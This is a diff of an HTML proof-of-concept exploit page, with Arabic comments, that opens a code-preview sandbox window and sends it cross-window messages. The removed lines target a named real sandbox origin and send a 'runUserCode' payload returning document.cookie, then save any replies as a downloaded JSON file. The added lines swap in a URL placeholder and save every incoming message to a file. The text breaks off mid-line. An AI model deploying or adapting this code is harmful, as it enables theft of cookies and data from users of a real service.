@@ -2,54 +2,31 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Remote Sandbox Exploit PoC</title>
+  <title>Remote Sandbox PoC</title>
 </head>
 <body>
-  <h2>🚀 Remote PoC – Sandbox Data Extraction</h2>
-  <button onclick="launch()">▶️ Launch Exploit</button>
+  <h2>🚀 Remote Data Extraction PoC</h2>
+  <button onclick="launch()">Open & Exploit Sandbox</button>
 
   <script>
-    let victimWin = null;
-    const collected = {};
+    let victimWin;
 
-    // استقبل أي ردود من الـ sandbox
-    window.addEventListener("message", (event) => {
-      console.log("📩 Received from sandbox:", event.origin, event.data);
-      if (event.origin.includes("web-sandbox.oaiusercontent.com")) {
-        collected.lastResponse = event.data;
-        saveFile();
-      }
-    });
-
-    // يفتح النافذة ويرسل الـ payload
     function launch() {
       console.log("🚀 Remote PoC started...");
-      victimWin = window.open("https://web-sandbox.oaiusercontent.com/", "victim", "width=800,height=600");
 
-      // انتظر شوية ثم ابدا ارسال payloads
-      setTimeout(() => {
-        console.log("📡 Sending exploit payload to sandbox...");
-        const payload = ["CALL", "runUserCode", ["return document.cookie"]];
-        victimWin.postMessage(payload, "*");
+      // 🔗 استبدل هذا بالرابط الصحيح اللي يطلع لك من preview
+      const sandboxUrl = "YOUR-SANDBOX-URL-HERE";
 
-        const echo = ["CALL", "echo", [{ hello: "from exploit" }]];
-        victimWin.postMessage(echo, "*");
-      }, 3000);
-    }
+      victimWin = window.open(sandboxUrl, "victim", "width=900,height=700");
 
-    // يحفظ أي بيانات رجعت في ملف JSON
-    function saveFile() {
-      const str = JSON.stringify(collected, null, 2);
-      const blob = new Blob([str], {type:"application/json"});
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = "sandbox_exploit_" + Date.now() + ".json";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      console.log("💾 File download triggered.");
-    }
-  </script>
-</body>
-</html>
+      window.addEventListener("message", (evt) => {
+        console.log("📩 Got message:", evt.origin, evt.data);
+
+        // حفظ البيانات وتنزيلها كملف JSON
+        const blob = new Blob([JSON.stringify(evt.data, null, 2)], {type: "application/json"});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "sandbox_data_" + Date.now() + ".json";
+        a.click();
+        c
